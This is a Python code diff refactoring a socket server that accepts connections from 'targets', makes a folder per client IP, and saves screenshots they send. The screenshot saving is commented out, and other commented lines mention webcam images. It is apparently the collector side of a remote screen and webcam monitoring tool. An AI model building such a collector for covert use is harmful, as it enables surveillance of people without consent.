@@ -20,9 +20,9 @@ class Server:
 
     def server_open(self) -> None:
         self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.get_server().setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 10)
-        self.get_server().bind((self.get_host(), self.get_port()))
-        self.get_server().listen()
+        self.get_server_socket().setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 10)
+        self.get_server_socket().bind((self.get_host(), self.get_port()))
+        self.get_server_socket().listen()
         print('>> Server start')
         self.server_accept()
 
@@ -30,16 +30,16 @@ class Server:
         while True:
             try:
                 print('>> Server Wait!!')
-                self.client_socket, self.addr = self.server_socket.accept()
-                self.utility.create_folder(self.addr[0])
-                self.client_socket.settimeout(100)
+                self.__client_socket, self.__addr = self.get_server_socket().accept()
+                self.get_util().create_folder(self.get_client_ip())
+                self.get_client_socket().settimeout(10000)
                 thread = threading.Thread(target=self.receiveTarget)
                 thread.start()
                 self.COUNT += 1
             except Exception as e:
-                self.get_client().close()
-                self.get_server().close()
-                self.__init__(self.get_host(), self.get_client())
+                self.get_client_socket().close()
+                self.get_server_socket().close()
+                self.__init__(self.get_host(), self.get_port())
 
     def receiveTarget(self):
         print('>> Connected by :', self.get_client_ip(), ':', self.get_client_port())
@@ -47,8 +47,7 @@ class Server:
         while True:
             try:
                 # length = self.recvall(self.client_socket, 64).decode('utf-8')
-                screen_shot = self.recvall_Test()
-
+                # screen_shot = self.recvall_Test()
                 # length = self.recvall(self.client_socket ,64)
                 # cam_img = self.recvall_Test()
  
@@ -59,11 +58,11 @@ class Server:
                 # info_decode_length = info_length.decode('utf-8')
                 # infomation = self.recvall_Test()
 
-                screen_shot_data = np.frombuffer(base64.b64decode(screen_shot), dtype='uint8')
+                # screen_shot_data = np.frombuffer(base64.b64decode(screen_shot), dtype='uint8')
                 # cam_img_data = np.frombuffer(base64.b64decode(cam_img), dtype='uint8')
                 
-                decimg = cv2.imdecode(screen_shot_data, 1)
-                cv2.imwrite(self.utility.get_path(self.addr[0]) + '\\' + f'screen_shot_{img_count}.png', decimg)
+                # decimg = cv2.imdecode(screen_shot_data, 1)
+                # cv2.imwrite(self.utility.get_path(self.addr[0]) + '\\' + f'screen_shot_{img_count}.png', decimg)
                 # decimg = cv2.imdecode(cam_img_data, cv2.IMREAD_UNCHANGED)
 
                 # cv2.imwrite(self.ROOT_path + '\\' + str(self.addr[0]) + '\\' + f'{self.addr[0]}_{img_count}.png', decimg)
@@ -83,23 +82,35 @@ class Server:
             buf += newbuf
             count -= len(newbuf)
         return buf
+
+
+    def save(self):
+        pass
     
+    def get_client_ip(self):
+        return self.__addr[0]
 
-    def recvall_Test(self):
-        data = b""
-        while True:
-            packet = self.client_socket.recv(4096)
-            if not packet:
-                break
-            data += packet
-        return data
+    def get_client_port(self):
+        return self.__addr[1]
 
+    def get_client_socket(self):
+        return self.__client_socket
+
+    def get_server_socket(self):
+        return self.__server_socket
+    
+    def get_host(self):
+        return self.__HOST
+    
+    def get_port(self):
+        return self.__PORT
+    
+    def get_util(self):
+        return self.__utility
     
 
 host_name = socket.gethostname()
 HOST = socket.gethostbyname(host_name)
 PORT = 9999
-
-print(HOST)
 
 server = Server(HOST, PORT)
